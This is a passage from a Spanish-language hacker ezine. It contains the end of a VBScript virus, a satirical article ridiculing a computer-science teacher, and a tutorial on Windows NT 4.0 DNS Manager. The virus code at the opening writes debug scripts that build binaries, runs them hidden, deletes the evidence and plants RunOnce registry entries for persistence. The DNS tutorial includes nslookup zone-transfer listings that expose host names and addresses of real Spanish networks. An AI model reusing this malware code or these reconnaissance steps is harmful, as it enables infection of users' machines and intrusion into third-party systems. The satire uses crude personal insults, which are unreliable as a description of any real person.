DrazSrcPif98.WriteLine("E 0450 00 00 00 00 00 00 00 16 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 04C0 00 00 00 00 00 01 00 ")
DrazSrcPif98.WriteLine("RCX")
DrazSrcPif98.WriteLine("400")
DrazSrcPif98.WriteLine("W")
DrazSrcPif98.WriteLine("Q")
DrazSrcPif98.Close()

Set DrazDebugPif = AccesoHD.CreateTextFile("C:\dbg.bat",1,false)
DrazDebugPif.WriteLine("@echo off")
DrazDebugPif.WriteLine("debug < C:\draz.src >nul")
DrazDebugPif.WriteLine("debug < C:\draz95.src >nul")
DrazDebugPif.WriteLine("debug < C:\draz98.src >nul")
DrazDebugPif.WriteLine("del C:\draz.src")
DrazDebugPif.WriteLine("del C:\draz95.src")
DrazDebugPif.WriteLine("del C:\draz98.src")
DrazDebugPif.Close()
Ejecutar.Run "C:\dbg.bat","0"

Set DraZInfectionClean = AccesoHD.CreateTextFile("C:\dclean.vbs",1,false)
DraZInfectionClean.WriteLine("On Error Resume Next")
DraZInfectionClean.WriteLine("Set AccesoHD = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")")
DraZInfectionClean.WriteLine("AccesoHD.DeleteFile " & Chr(34) & "C:\dbg.bat" & Chr(34))
DraZInfectionClean.WriteLine("AccesoHD.DeleteFile " & Chr(34) & "C:\dclean.vbs" & Chr(34))
DraZInfectionClean.Close()

Ejecutar.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\DraZInfectClean" , "C:\WINDOWS\wscript.exe C:\dclean.vbs"
Ejecutar.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\DraZInfect95Clean" , "C:\WIN95\wscript.exe C:\dclean.vbs"
Ejecutar.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\DraZInfect98Clean" , "C:\WIN98\wscript.exe C:\dclean.vbs"
Ejecutar.Run "C:\WINDOWS\dinit.vbs","0"
Ejecutar.Run "C:\WIN95\dinit.vbs","0"
Ejecutar.Run "C:\WIN98\dinit.vbs","0"

<-->


Nada mas, saludos a toda la peña, y a leer, que son dos dias.



MoebiuZ <moebiuz@netsearch-ezine.com>


-----BEGIN GEEK CODE BLOCK-----
Version: 3.1
  GE/MU/CM d- s-:- a-- C++(+++)>$ UL+++>$ P+ L++ E+ W+++ N+ o? K? w !O !M
  !V PS PE Y PGP++ t 5 X++ R++ tv+() b++ DI? D+ G e h+ r+ y+
------END GEEK CODE BLOCK------



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x08 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Mi profe de Informatica ]-===============================================
=-[ por RaiSe ]-=============================================================



	
			    {[ Critica ironica ]}	
	 	-------------------------------------------
 	 	l          Mi profe de Informatica        l
	 	-------------------------------------------
		          [ Basado en un caso real ]




En este texto voy a intentar explicar los metodos y las pruebas a seguir
para diferenciar si nuestro profesor de informatica es un 'ententido' o es
el tipico 'paleto de turno'. Da igual que estes en el instituto, en clase
particular o la universidad, todos los especimenes analizados se comportan
de forma similar sin importar el sitio o institucion en el que se
encuentren.



Prueba 1:  
^^^^^^^^^^^

Esta es la prueba que mas nos llamara la atencion, y es que nada mas que
entre el profesor por la puerta te daras cuenta de una forma impactante, es
lo que llamaremos: "Cara capullo" o "Vaya feo que eres". Cuando un individuo
presenta esta caracteristica se diferencia del resto de las personas por
unos rasgos especiales en su cuerpo, normalmente en la cabeza y cara. No se
sabe a ciencia cierta porque todos presentan esta fisionomia, quizas
desciendan todos del mismo primate, lo que explicaria sus similares y torpes
comportamientos a la hora de explicar algo. Mas o menos esta peculiaridad se
resume en que la cara del individuo parece sacada de un reportaje de
chimpances..


Prueba 2:  
^^^^^^^^^^^

Otra prueba inherente de que nos encontramos ante un autentico paleto "pura
raza" es su forma de vestir, normalmente tendra un estilo propio hortera
total. Uno se pregunta donde se deja el hombre el gusto cuando va a comprar
ropa.. Un ejemplo tipico suele ser camiste/polo ajustada marcando
michelines, acompañado de un pantalon color beis y unos calcetines que no
suelen pegar nada con los zapatos. Y esto es solo la ropa, del corte de pelo
mejor no hablar..


Prueba 3: 
^^^^^^^^^^^

Otra caracteristica que los distingue a distancia es su gesticulacion con
las manos y brazos durante una explicacion. El individuo en particular suele
emocionarse de tal manera con lo que esta contando que empieza a
contorsionar la parte superior del cuerpo de forma que parece que esta
dirigiendo el trafico en la Gran Via. Sus movimientos de manos son
constantes, debe ser que se toma algo antes de clase porque aguantar 2 o 3
horas asi seguidas tiene merito.. Mano pa'alante, mano pa'atras, movimientos
en circulos, giros de 180 grados.. su repertorio no suele tener desperdicio.


Prueba 4: 
^^^^^^^^^^^

Cuando llegamos a este punto su identificacion como "paleto" suele ser ya
inmediata, me estoy refiriendo por supuesto a su nivel de ingles.
Normalmente el personaje tiene peor pronunciacion que su padre/madre que
vivio toda su vida en el pueblo entre vacas y ovejas. Pero claro.. eso no es
problema para el, ya que cuando tiene que pronunciar una palabra un tanto
compleja usa un truco infalible: pronuncia la palabra de unas 3 o 4 formas
distintas, asi no hay lugar para el error. Un claro ejemplo es por ejemplo
la palabra "interface", el individuo diria algo como: "y aqui tenemos el
interfaze.. o interfeis.. o interfaz.. o interfiss..", como es obvio con
alguna de las pronunciaciones acertara.


Prueba 5: 
^^^^^^^^^^^

Esta es una de las pruebas que tiene relacion directa con su forma de
hablar, y se caracteriza por el uso constante (y cuando digo constante me
refiero a unas 5 veces cada 10 sg) de las tipicas coletillas. Hay varios
tipos de coletillas.. tenemos al tipico que habla asi: "esto es un disco
duro.. es decir.. sirve para almacenar datos.. es decir.. bytes.. es decir..
bits.. es decir.. que estaba diciendo?.. es decir.. me estoy meando.. es
decir.. adios..". Tambien tenemos al tipico que cada poco intenta
autoconvencerse a si mismo de lo que esta diciendo por medio de una pregunta
retorica. Tambien suele usar ruidos extraños para evitar las pausas que
surgen entre frase y frase. Este caso seria algo como: "un disco
duro..eh!..sirve para almacenar..mmm..bytes..eh!..dentro de
unas..mmm...pistas..eh!...en las cuales...mmm...eh!..eh!..mmm...mmm...eh!..
ya me perdi.. me cago en la leche!".


Prueba 6: 
^^^^^^^^^^^

Para darse cuenta de esta caracteristica, muy comun por cierto, hay que
observar detenidamente al sujeto cuando esta explicando algo, me estoy
refiriendo a los "tics". Un caso muy normal es, si el profesor lleva gafas,
estar tocandolas continuamente; dice frase, limpia gafa, dice frase, toca
gafa, dice frase, limpia gafa, etc. Otro caso bastante comun es el
"tembleque de pierna", y consiste en un pequeño temblorcillo que le empieza
en el pie y le acaba en la parte superior de la pierna. Suele ir pasando de
pierna a pierna, tiembla una, tiembla otra, tiembla una, tiembla otra, y asi
sucesivamente. Pero sin duda el mas corriente de la especie es el
"manipulamiento de boli", tambien llamado "suelta el boli de una p.vez que
me estas poniendo nervioso". Este tic consiste en coger el boligrafo en medio
de la explicacion y empezar a manosearlo, sobarlo, darle vueltas, quitarle
la tapa, volversela a poner, y cualquier movimiento imaginable y que
permitan las reglas de la fisica con el mismo. La verdad es que es bastante
molesto para el alumno.


Prueba 7: 
^^^^^^^^^^^

Si su profesor cumple todas pruebas hasta aqui, lo mas problable es que esta
tambien la cumpla, la del dictado. Aqui la regla es general; todos, a la
hora de dictar un texto a los alumnos van improvisando sobre la marcha. El
resultado es que al acabar de copiar un parrafo te pones a leerlo y no
entiendes absolutamente nada. Los errores mas comunes son frases sin
sentido, puntos que no deberian ir ahi, verbos mal conjugados, etc. Lo
gracioso es cuando tu te lo empollas asi, lo pones calcado en un examen y el
profe te dice que primero aprendas a redactar porque no tienes ni pajolera
idea de escribir dos frases seguidas.. patetico.


Prueba 8: 
^^^^^^^^^^^

Otra caracteristica son las paralisis cerebrales que le dan en medio de una
explicacion. Su duracion es variable, pero suelen oscilar entre 2 segundos y
10 segundos. Consiste en que el profesor esta explicando algo y en medio de
una frase se queda totalmente paralizado, pasan unos segundos de espera y
continua como sino hubiera pasado nada. Durante esos breves segundos esta
comprobado cientificamente que puedes hacer absolutamente de todo, ya que el
individuo se encuentra en una profunda paralisis total y no se dara cuenta
de nada de lo que ocurra a su alrededor.

Nota: aunque en medio de la paralisis te entren unas ganas enormes de
decirle: "pero despierta gilipollas!", esto no es recomendable ya que podria
causarle unos daños cerebrales importantisimos e irreparables, tomeselo con
calma y espere a que se le pase la paralisis. Si ve que pasan unos cinco
minutos y continua en el mismo estado puede ser debido a dos cosas: una que
se haya muerto debido a un coagulamiento del cerebro al intentar pensar mas
de lo le es fisicamente posible, y la segunda que siga pensando y no termine
de encontrar la solucion, en este caso de vez en cuando se le oira balbucear
cosas por lo bajo (mm..eh!..mm..eh!..eh!).


Prueba 9:
^^^^^^^^^^^

Esta cualidad suele darse bastante a menudo y es bastante definitoria. Me 
estoy refiriendo a la pinta de borracho perdido que suele tener el
individuo, la cual te hara dudar muchas veces si realmente esta borracho
cuando llega a clase o solo lo parece. Esta prueba suele acompañarse de
equivocos continuos a la hora de intentar vocalizar una palabra compleja, y
un continuo efecto de tartamudeo, de forma que si a esta prueba le sumas
todas las anteriores tienes ante ti a un ser sumamente extraño.


Prueba 10:
^^^^^^^^^^^

Y la ultima prueba es la de los dibujitos. El individuo tiene que
hacer todo lo posible para perder horas de clase, ya que sino se queda sin
nada que explicar. Esto es debido a que lo que tiene que dar en clase lo
estudia el dia anterior en casa, y si llega al final de lo que habia
estudiado se queda en blanco, cosa que le dejaria aun mas en ridiculo
delante de la clase (tarea practicamente imposible debido al ridiculo diario
que realiza). Pues bien, una de sus tacticas preferidas para perder tiempo
son los dibujitos en la pizarra. Si tiene que dibujar un monitor, un boli,
un elefente, o una hormiga, el se lo tomara con toda la calma del mundo, e
intentara hacer el dibujo lo mejor posible, incluso a veces añadiendole
vistas en 3D, im-presionante. A la vez que va dibujando suele ir haciendo
unas muecas horribles con la cara, con las que tu te empiezas a descojonar y
ya no sabes que hacer para parar de reirte. Si te ocurre esto puedes probar
a morderte la lengua o a descojonarte abiertamente, total el profe es tan
sumamente "lelo" que nunca creera que te estas riendo de el.


Conclusion:
^^^^^^^^^^^^

Como habreis podido comprobar este texto esta escrito en un tono un tanto
ironico. Y es que no hay instituto o universidad en el que no haya algun
elemento de estos, lo que te hace preguntarte si los fondos publicos no
llegaran para contratar autenticos profesionales, en vez de profesores de
matematicas reformados por medio de un curso de 100 horas, despues del cual
se creen que estan capacitados para dar clases de informatica. A mi este
año me esta tocando vivir uno de estos "especimenes" en mis propias carnes,
la verdad es que es no es mal tio del todo.. lo bueno de sus clases es que
te ries sin parar. Pero vamos.. los institutos, sobre todo, deberian
tomarse sus asignaturas de informatica un poco mas en serio y contratar a
autenticos profesores CUALIFICADOS.

Un saludo a tod@s y hasta otra.


RaiSe



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x09 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ DNS Manager. Windows NT 4.0 (v.2.0) ]-===================================
=-[ por |CoDeX| ]-===========================================================




Indice:

 1.- Introduccion
 2.- Estructura del DNS
 3.- Solicitud de DNS y proceso de busqueda
 4.- Instalacion
 5.- Configuracion y alta de dominios en el DNS Manager
 6.- Propiedades del DNS
 7.- Duda retorica
 8.- NSLookup
 9.- Ejemplo de alta de un dominio '.es' en nic.
10.- Bibliografia


1.- Introduccion


El servicio de DNS (Domain Name System) se utiliza para asignar nombres a
los ordenadores en Internet y nos permite traducir nombres de maquinas
(hosts) a direcciones IP y viceversa. Siempre sera mas facil recordar un
nombre que unos numeros. Ejemplo:  Host: www.undersec.com IP: 62.164.20.60


2.- Estructura del DNS


Cada ordenador esta formado por la sucesion jerarquica de dominios, que
estaran separados por puntos (' . ') y que empiezan por el subdominio
inferior.

Las normas para los nombres de dominios las establece InterNIC (Internet
Network Information Center). http://www.internic.net

Dominios de nivel superior de tres posiciones:

com ----- Comercial
edu ----- Educativo
gov ----- Gobierno
org ----- Organizacion
net ----- Proovedores ('Networking')
mil ----- Militar
int ----- Internacional

Dominios geograficos de dos posiciones:

es ----- España
de ----- Alemania
se ----- Suecia
at ----- Austria
ch ----- Suiza
jp ----- Japon
su ----- Union Sovietica
uk ----- Gran Bretaña

En el DNS, cada dominio por debajo de estos dominios de nivel superior puede
estar formado como maximo por 63 caracteres y no se permite el uso de
caracteres especiales. Solo esta permitido el uso de los caracteres 'a-z',
'A-Z', '0-9', y '-'. Estos nombres deben ser unicos.

Ejemplos: 
Dominio: networking-center.org
              |             |
              |             Dominio de primer nivel
              Dominio de segundo nivel

Direcciones de interes:
http://www.networksolutions.com
http://www.nic.es


3.- Solicitud de DNS y proceso de busqueda


Caso 1:

                   (1)
Cliente -------------------------------> Servidor DNS 
   |<---------------<-----<---------<-------|  
                   (2)                         


En este caso, el cliente pide a el servidor DNS que tenga configurado que le
resuelva un host (Paso 1). Luego el servidor de DNS devuelve al cliente si
existe o no ese host y con que IP (Paso 2).


Caso 2:                                             

                   (1)
Cliente -------------------------------> Servidor DNS 
   |<---------------<-----<---------<-------|  |
                   (3)                         |(2)
                                               |
                                           Root Server


En este otro caso, el cliente pide a el servidor DNS que tenga configurado
que le resuelva un host (Paso 1). Luego el servidor de DNS ve que no lo
tiene en su 'cache' y manda la solucitud a un Root Server, que le devolvera
si existe o no el dominio y con que IP, pero ademas lo guardara en su
'cache' para no tener que acudir a un Root Server la proxima vez que le
pregunten por ese mismo host (Paso 2). Acto seguido, el servidor de DNS
devuelve al cliente si existe o no ese host y con que IP (Paso 3).


4.- Instalacion


Lo primero que tienes que hacer es tener configurado en el protocolo TCP/IP
el nombre de tu PC y Dominio, y en dns pon tu ip (puesto que tu seras
servidor de dns). Luego tienes que agregar el servicio de DNS y para ello te
vas al panel de control, entorno de red, services, agregar, DNS.

Una vez agregado tendras que reiniciar la maquina. Una vez reiniciado, es
aconsejable que vuelvas a instalar el ultimo Service Pack que tuvieras
metido, para asegurarte de que todo funcionara bien (y reinicias de nuevo).
Una vez echos todos estos pasos ya estamos listos para comenzar a usar el
servidor de DNS.


5.- Configuracion y alta de dominios en el DNS Manager

Lo primero que debes hacer es asegurarte que tienes el servicio activo y
funcionando. Para ello, ve al panel de control, a servicios y asegurate que
el servicio esta funcionando.

Luego debemos ir a las Herramientas Administrativas y abrir el DNS Manager,
te creas un 'New Server', que sera tu maquina, luego pondras tu IP y a
empezar a dar de alta dominios. Una vez que agregas tu ip, saldra una
especie de mundo que se llama cache y que memoriza las direcciones ip de los
servidores que no conoce, o sea.. memoriza los dominios que no conoce. En
teoria es obligatorio tener un servidor de dns primario y otro secundario, y
cada uno debe estar en una red distinta.

Como dariamos de alta un dominio?

Server List - New Server

IP:192.168.1.2 -- New Zone -- Primary -- zone name: codex.es -- zone file:
codex.es.dns

Ahora nos creara una carpeta con el nombre codex.es y le damos sobre ella al
boton derecho y a propiedades.

En la ventana SOA Records:

El mail de la persona responsable del DNS no se pone tipo 
usuario@dominio.com, si no que se hace de la siguiente manera: 
usuario.dominio.com

* Serial Number: 2000030401 (los ultimos dos numeros es el numero del
dominio que se ha dado de alta en el dia y el resto es la fecha del dia
puesta al reves.  Esto se hace para llevar un mejor control de los
dominios).

* Intervalo de refresco: 24 Horas 
* Retry Iterval: 2 Horas
* Expire Time: 30 Dias 
* Minimun Default: 2 Dias 
* TTL: 2 Dias

* Intervalo de refresco: El tiempo que esperara un servidor secundario entre
comprobaciones de su servidor maestro para ver si el archivo de base de
datos ha cambiado y si hay que pedir una transferencia de zona. Sabe si
tiene o no que actualizar por el 'Serial Number'.

* Retry Iterval: El tiempo que esperara un servidor secundario antes de volver
a intentar una transferencia de zona que haya fallado.

* Expire Time:  El tiempo que un servidor secundario seguira intentando
descargar una zona. Cuando haya pasado este tiempo, se rechazara la informacion
antigua de la zona.

* TTL: El tiempo que un servidor DNS tiene permitido acumular en la cache
cualquier registro del recurso de este archivo de base de datos. El tiempo
empezara a contar en el momento en que se mete en cache y aunque mas tarde haya
mas peticiones al mismo dominio, el tiempo no empezara de nuevo.

Nota: En un servidor de DNS Secundario, no se pueden modificar los registros
de los dominios y no actualizara la cache si el DNS Primario esta caido
puesto que quien actualiza de los Root-Servers es el primario, y el
secundario actualiza del primario.

Le damos a Ok y volvemos a la pantalla principal del DNS Manager. Una vez
alli vamos al menu de arriba a options -> preferences y activamos el
refresco cada 5 segundos.

Volvemos a la carpeta codex.es y vemos que tenemos un record NS y otro SOA.
Nos queda crear un record tipo A y un CNAME, de forma que al final quedara
de la siguiente forma:

codex.es

codex.es	NS	Nombre_PC.dominio
codex.es	SOA	Nombre_PC.dominio
Nombre_PC 	A	IP_del_PC
www		CNAME	Nombre_PC
ftp		CNAME	Nombre_PC
mail		A	IP_del_PC
codex.es	MX	[10] mail.codex.es

 
Antes de seguir, aclaremos que es eso de NS, CNAME,...  Un registro de tipo
NS hace referencia al nombre del servidor del dominio. Si tuvieramos un
servidor de DNS Secundario, habria tambien que crear otro registro de tipo
NS que apuntara a el. El SOA simplemente es el registro que mantiene la
configuracion de ese dominio dentro del DNS. El registro de tipo A se
utiliza para asociar un nombre con una ip.  El MX se usa para apuntar al
servidor de correo de un dominio. Dentro de este registro, el 'preference
number' se utiliza cuando tenemos varios registros MX para el mismo dominio.
Se pondria un numero, que es la prioridad en los servidores. Cuanto menor
sea el numero, mayor importancia. Por lo general se le suele poner 10.
Tambien se debe conocer que para poder poner un registro MX, hay que crear
antes uno tipo A que apunte a la maquina que tiene el servidor de correo.
Esto ultimo, en el DNS Manager del w2k ya no es necesario hacerlo.

Esta forma anterior es mala en aquellos casos en que te vayan a pedir
estadisticas de las webs que haya alojadas ya que aparece la ip del host
donde esta la web y no aparece la url de la pagina. Esto lo conseguimos
evitar de la siguiente forma:

codex.es

codex.es	NS	IP_del_PC
codex.es	SOA	IP_del_PC
Nombre_PC 	A	IP_del_PC
www		A	IP_del_PC_que_ofrece_el_servio_www
ftp		A	IP_del_PC_que_ofrece_el_servio_ftp


Cuando estemos añadiendo los "record" nos dara la opcion de añadir un PTR,
que sale señalada por defecto. No se trata de otra cosa que de una DNS
inversa. (tendriamos que crear nosotros la zona)
Ejemplo: IP: 192.168.1.2
DNS Inversa: 1.168.192.In-addr.arpa


Recuerda añadir en la configuracion del TCP/IP, en las DNS, tu ip de la
maquina.

Nota: Todos los dominios que vayais creando se iran almacenando en archivos
de texto que podreis encontrar en c:\winnt\system32\dns. Por ejemplo, si
creo el dominio codex.es tendre el respectivo codex.es.dns Si queremos
borrar un dominio, no nos basta con borrarlo en el dns manager, sino que
tambien tendremos que borrar su respectivo archivo de c:\winnt\system32\dns
Aunque a primera vista esto parezca un rollo, es bastante bueno porque si
borrais accidentalmente algun dominio, podreis acudir a ese archivo de texto
para restaurarlo :)

El registro SOA tendremos que actualizarlo cada vez que modifiquemos algun
registro de un dominio que tengamos dado de alta en nuestro DNS. Si
cambiamos o creamos algun otro registro, deberemos modificar el 'Serial
Number' con la fecha actual y el numero de dominio que se da de alta o se
modifica en el dia. Si no hacemos eso, el resto de servidores de DNS no
sabran que los registros de ese dominio han cambiado y por tanto no
actualizaran su cache.


6.- Propiedades del DNS

-> Interfaces: La IP que actua como DNS

-> Fowarders: Se refiere a como actuara mi servidor, como primario o
secundario. Si opera como secundario, tendremos que marcar la casilla 'Operate
as slave server' e indicarle la IP del servidor de DNS Primario.

-> Boot Method: Simplemente se refiere a la forma de trabajar con el sistea,
bien en modo texto o bien en modo grafico.


7.- Duda retorica


Os comento cierta duda que tengo del dns maganer.. vereis, al dar de alta un
dominio, por ejemplo codex.es no me da la posibilidad de crear un registro
tipo A llamado codex.es de forma que si hiciera un ping codex.es me
devolviera la ip que se le dijera.

Ej:
codex.es    A   212.79.133.40
www         A   212.79.133.40
ftp         A   212.79.133.40

Esto si se puede hacer con el DNS Manager del W2K. Bien, estuve pensando un
poko y lo que hice fue crear una nueva zona que se llamara ' es ' en la cual
me mete directamete todos los dominios 'es' que tuviera y una vez ahi,
creaba un registro tipo A a codex.es y si me lo permitia.

Ej:
212.79.133.40
|
|- codex.es
|- pepito.es
|
|- es
|    |- codex
|    |- pepito
|

Bien, como he dicho antes, asi si me permite crear el ' codex.es A
212.79.133.40 ' pero claro, no resuelvo los dominios 'es', con lo cual pues
mi gozo en un pozo.. mi sorpresa fue cuando borre la zona 'es' porque en
codex.es se habia quedado el registro tipo A ( codex.es A 212.79.133.40 )

Si edito el archivo c:\winnt\system32\dns\codex.es.dns me aparece lo
siguiente:


;  Database file codex.es.dns for codex.es zone.
;      Zone version:  3
;

@                       IN  SOA nt.supercable.es. . (
                        	3           ; serial number
                        	3600        ; refresh
                        	600         ; retry
                        	86400       ; expire
                        	3600      ) ; minimum TTL

;
;  Zone NS records
;

@                       NS	nt.supercable.es.

;
;  Zone records
;

@                       A	212.79.133.40
www                     A	212.79.133.40


Al parecer el ' codex.es A 212.79.133.40 ' lo mete como: ' @ A 212.79.133.40
' pero si se intenta hacer de forma manual lo ignora totalmente. Si alguien
sabe algo a cerca de lo que comento aqui que se ponga en contacto conmigo a
traves de e-mail (codex@netsearch-ezine.com) ya que he preguntado a bastante
gente y en varias listas de correo y nadie me ha sabido decir si esto es
posible o no.


7.- NSLookup


nslookup es una de las principales herramientas de diagnostico a la hora de
depurar una arquitectura de sistema de nombres de dominio (DNS). Se puede
usar para mostrar cualquier registro de recurso de cualquier servidor DNS,
incluyendo implementaciones DNS de unix.

C:\>nslookup
Default Server:  seux002.supercable.es
Address:  212.79.128.3

> set type=any
> supercable.es
Server:  seux002.supercable.es
Address:  212.79.128.3

supercable.es   nameserver = seux005.supercable.es
supercable.es   nameserver = seux002.supercable.es
supercable.es
        primary name server = seux002.supercable.es
        responsible mail addr = root.supercable.net
        serial  = 2000042401
        refresh = 86400 (1 day)
        retry   = 3600 (1 hour)
        expire  = 2592000 (30 days)
        default TTL = 172800 (2 days)
supercable.es   MX preference = 10, mail exchanger = seux002.supercable.es
supercable.es   nameserver = seux005.supercable.es
supercable.es   nameserver = seux002.supercable.es
seux005.supercable.es   internet address = 212.79.128.18
seux002.supercable.es   internet address = 212.79.128.3

C:\>nslookup
Default Server:  seux002.supercable.es
Address:  212.79.128.3

> ls supercable.es
[seux002.supercable.es]
 supercable.es.                 NS     server = seux005.supercable.es
 supercable.es.                 NS     server = seux002.supercable.es
 sewms001                       A      212.79.128.26
 cliente-212079146001.cm128.agnpa A      212.79.146.1
 cliente-212079146002.cm128.agnpa A      212.79.146.2
 cliente-212079146003.cm128.agnpa A      212.79.146.3
 cliente-212079146004.cm128.agnpa A      212.79.146.4
 cliente-212079146005.cm128.agnpa A      212.79.146.5
 cliente-212079146006.cm128.agnpa A      212.79.146.6
 cliente-212079146007.cm128.agnpa A      212.79.146.7
 cliente-212079146010.cm128.agnpa A      212.79.146.10
 cliente-212079146008.cm128.agnpa A      212.79.146.8
 cliente-212079146011.cm128.agnpa A      212.79.146.11
 cliente-212079146009.cm128.agnpa A      212.79.146.9
 .
 .
 .
 .
 cliente-213227019135.cm256.manpd A      213.227.19.135
 cliente-213227019136.cm256.manpd A      213.227.19.136
 cliente-213227019137.cm256.manpd A      213.227.19.137
 distribuidores                 A      212.79.128.11

> server 195.57.10.2
Default Server:  sigrid.sodefesa.es
Address:  195.57.10.2

> ls sodefesa.es
[sigrid.sodefesa.es]
 sodefesa.es.                   NS     server = sigrid1.sodefesa.es
 sodefesa.es.                   NS     server = sigrid.sodefesa.es
 ftp                            A      195.57.10.25
 news                           A      194.179.3.124
 poseidon                       A      195.57.10.25
 private                        A      195.57.10.7
 prometeus                      A      195.57.10.29
 sigr1                          A      195.57.10.53
 sigrid                         A      195.57.10.2
 sigrid1                        A      195.57.10.3
 www                            A      195.57.10.25



8.- Ejemplo de alta de un dominio ' .es ' en nic.


Aqui os pongo un ejemplo del formulario que hay que rellenar y mandar por
e-mail para dar de alta un domio 'es' en http://www.nic.es

Nota: Todo lo que vaya entre ' /* texto */ ' son comentarios mios
aclaratorios.

/* Conviene dar de alta el dominio en el servidor DNS de la makina y luego
mandar la solicitud. Cuando se mande el formulario, hay que hacerlo en
'Plain Text' */

------8<------------- Cortar por aqui (No enviar esta linea) -------------

FSE Version: 1.0

SECCION 0 - Tipo Solicitud

0a. Accion a efectuar 
    (N|CR|B|CD)..................: N
0b. Estado Dominio (para N, CR o CD)
    (R|D|MX).....................: R
0c. Dominio a expirar (para CD)..: .es

SECCION 1 - Dominio Objeto de Registro

1.  Nombre Dominio...............: codex.es

SECCION 2 - Organizacion Usuaria del Nombre de Dominio /* Solo permite
registrar marcas registradas o acronimos.*/

2a. Nombre Organizacion Completo.:
2b. Forma Juridica...............:  
2c. N.I.F........................: 45710999-K /* DNI con la letra del NIF */
2d. Fecha de Constitucion........: 19790320 /* año mes dia (todo junto)*/
2e. Domicilio (Calle,No...)......:  
2f. Domicilio (Municipio)........: 
2g. Domicilio (Cod. Postal)......: E-41010 /* el 'E-' debe mantenerse*/
2h. Domicilio (Provincia)........: 
2i. Domicilio (Pais).............: SPAIN

SECCION 3 - Para Nombre de Dominio Asociado a Marca Registrada en lugar de al
Nombre Oficial de la Organizacion

3a. Marca Registrada en OEPM.....:    /* nombre de la marca */
3b. Numero Inscripcion en OEPM...:    /* el nuemero que sea. Ej: 23458790/X */
3c. Fecha de Concesion...........:    /* año mes dia (todo junto) */

SECCION 4 - Persona de Contacto Administrativo

4a. NIC Handle...................:  /* es un codigo. hay que dejarlo en 
				       blanco. una vez registrado el dominio
				       nos dan el NIC handle y para el proximo
				       dominio que queramos registrar solo
				       tenemos que poner ese codigo, sin 
				       necesidad de rellenar el resto de los
				       datos */

4b. Nombre y Apellidos...........:  
4c. Nombre Organizacion Completo.:  /* lo mismo que hemos puesto en '2a'. 
				       EXACTAMENTE IGUAL. */

4d. Nombre Departamento..........:  
4e. Cargo........................:  /* conviene poner al gerente o director 
				       de la empresa, ya que es la persona
				       que figura en las escrituras. */

4f. Direccion (Calle,No...)......:  /* la direccion de la empresa, no la del
				       gerente o director. */

4g. Direccion (Municipio)........:
4h. Direccion (Cod. Postal)......:
4i. Direccion (Provincia)........:
4j. Direccion (Pais).............:   SPAIN
4k. E-mail.......................:   /* usuario@nombredominio.es Hay que 
					hacerlo, sino te lo rechazan. */

4l. Numero Fax...................: +34 5 54340158 /* Formato: +34 5 54340158
				                     (el primer nº del prefijo
						     no se pone. En el caso de
						     ser Sevilla, el '9' del
				                     '954' no se pone) */

4m. Numero Telefono..............: +34 5 54340158   /* Igual que en el '4l' */

SECCION 5 - Persona(s) de Contacto Tecnico  /* Datos de la empresa proovedora
					       (ISP). */

5a. NIC Handle...................:   /* Si es el primer registro de dominio
					hago pues no tengo Nic Handle y tengo
					que rellenar los otros datos. En caso
				  	de tenerlo solo rellenariamos el '5a'
				        */

5b. Nombre y Apellidos...........:   
5c. Nombre Organizacion Completo.:   /* Nombre del Proovedor */
5d. Nombre Departamento..........:   
5e. Cargo........................:
5f. Direccion (Calle,No...)......:
5g. Direccion (Municipio)........:
5h. Direccion (Cod. Postal)......:
5i. Direccion (Provincia)........:
5j. Direccion (Pais).............:
5k. E-mail.......................:
5l. Numero Fax...................:
5m. Numero Telefono..............:

SECCION 6 - Persona de Contacto Facturacion /* Datos de la persona que pagara
 					       la factura. */

6a. NIC Handle...................: /* Si ya tenemos no hace falta rellenar el
				      resto */

6b. Nombre y Apellidos...........:
6c. Nombre Organizacion Completo.: /* El mismo que en la seccion 5.*/
6d. Nombre Departamento..........:
6e. Cargo........................:
6f. Direccion (Calle,No...)......:
6g. Direccion (Municipio)........:
6h. Direccion (Cod. Postal)......:
6i. Direccion (Provincia)........:
6j. Direccion (Pais).............:
6k. E-mail.......................:
6l. Numero Fax...................:
6m. Numero Telefono..............:
6n. N.I.F. (Organizacion en 6c)..:

SECCIONES 7 Y 8 - Para Delegacion de Zona Asociada al Dominio 

7a. Nombre Servidor Primario.....:  /* nombre del servidor de DNS. 
				       Ej: ns1.arrakis.es*/
7b. Direccion IP S. Primario.....:  /* la IP */
8a. Nombre Servidor Secundario...:  /* nombre del servidor de DNS.
				       Ej: ns2.arrakis.es*/
8b. Direccion IP S. Secundario...:  /* la IP */

SECCION 9 - Para Registro(s) MX asociado(s) al Dominio

9a. Nombre Estafeta E-mail SMTP..: /* Esto dejarlo en blanco. */

SECCION 10 - Proveedor(es) de Servicio de Acceso a Internet

10. Acronimo de Proveedor........:  /* Ej: arrakis o interbook o supercable
					   ... */

/* Despues de esto aparece el tipico texto en el que nos ponen los
'requisitos' y 'deberes' para la aceptacion del dominio. */

------8<------------- Cortar por aqui (No enviar esta linea) -------------


9.- Bibliografia


* Apuntes de clase de NT de 2º de Administracion de Sistemas Informaticos.
* El gran libro de Windows NT. Ed. Marcombo, 1996 Madrid.
